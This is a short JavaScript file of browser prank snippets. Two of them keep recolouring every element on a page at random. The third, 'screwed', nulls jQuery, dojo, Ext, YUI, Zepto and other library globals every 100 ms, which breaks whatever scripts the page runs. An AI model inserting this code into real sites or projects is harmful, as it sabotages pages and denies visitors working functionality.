function r() {
    return Math.floor(Math.random() * 255);
}

function lemon() {
    with(this.style) {
        color = ['rgb(', [r(), r(), r()].join(','), ')'].join('');
        backgroundColor = ['rgb(', [r(), r(), r()].join(','), ')'].join('');
    }
}

function rocks() {
    Array.prototype.forEach.call(document.all, function(item) {
        setTimeout(function() {
            lemon.call(item);
        }, Math.random() * 100 + 100);
    });
    setTimeout(rocks, Math.random() * 500 + 100);
}

rocks();
function r() { return Math.floor(Math.random() * 255); }
function fakk(){ this.style.color = ['rgb(',[r(),r(),r()].join(','),')'].join(''),
this.style.backgroundColor = ['rgb(',[r(),r(),r()].join(','),')'].join(''); }
[].forEach.call(document.all, function(item) {
    setTimeout(function() {fakk.call(item)}, (Math.random()*500)+100)
});
(function(window) {
  function screwed() {
    window._ = null;
    window.$ = null;
    window.$A = null;
    window.$F = null;
    window.$H = null;
    window.$R = null;
    window.$w = null;
    window.$defined = null;
    window.$type = null;
    window.$merge = null;
    window.$extend = null;
    window.$native = null;
    window.$chk = null;
    window.$pick = null;
    window.$random = null;
    window.$time = null;
    window.$clear = null;
    window.$$ = null;
    window.dojo = null;
    window.Ext = null;
    window.jQuery = null;
    window.SC = null;
    window.YAHOO = null;
    window.YUI = null;
    window.Zepto = null;
    window.setTimeout(screwed, 100);
  }
  screwed();
})(this);
